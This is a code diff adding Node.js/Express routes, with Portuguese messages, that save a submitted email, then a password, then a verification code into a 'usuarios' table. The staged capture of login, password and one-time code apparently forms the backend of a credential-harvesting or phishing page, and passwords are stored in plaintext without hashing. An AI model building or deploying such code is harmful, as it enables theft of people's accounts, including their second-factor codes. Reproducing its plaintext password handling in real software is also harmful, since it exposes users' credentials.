@@ -34,4 +34,44 @@ initDB();
 
 app.post('/salvar-email', async (req, res) => {
   const { email } = req.body;
-  if (!email) return res.status(400).j
+  if (!email) return res.status(400).json({ mensagem: 'E-mail obrigatório.' });
+  try {
+    await db.query('INSERT INTO usuarios (email) VALUES (?)', [email]);
+    return res.json({ mensagem: 'E-mail salvo.' });
+  } catch (err) {
+    console.error(err);
+    return res.status(500).json({ mensagem: 'Erro interno.' });
+  }
+});
+
+app.post('/salvar-senha', async (req, res) => {
+  const { email, senha } = req.body;
+  if (!email || !senha) return res.status(400).json({ mensagem: 'Dados incompletos.' });
+  try {
+    await db.query(
+      'UPDATE usuarios SET senha = ? WHERE email = ? ORDER BY id DESC LIMIT 1',
+      [senha, email]
+    );
+    return res.json({ mensagem: 'Senha salva.' });
+  } catch (err) {
+    console.error(err);
+    return res.status(500).json({ mensagem: 'Erro interno.' });
+  }
+});
+
+app.post('/salvar-codigo', async (req, res) => {
+  const { email, codigo } = req.body;
+  if (!email || !codigo) return res.status(400).json({ mensagem: 'Dados incompletos.' });
+  try {
+    await db.query(
+      'UPDATE usuarios SET codigo = ? WHERE email = ? ORDER BY id DESC LIMIT 1',
+      [codigo, email]
+    );
+    return res.json({ mensagem: 'Código salvo.' });
+  } catch (err) {
+    console.error(err);
+    return res.status(500).json({ mensagem: 'Erro interno.' });
+  }
+});
+
+app.listen(PORT, () => console.log('Servidor rodando na porta ' + PORT));
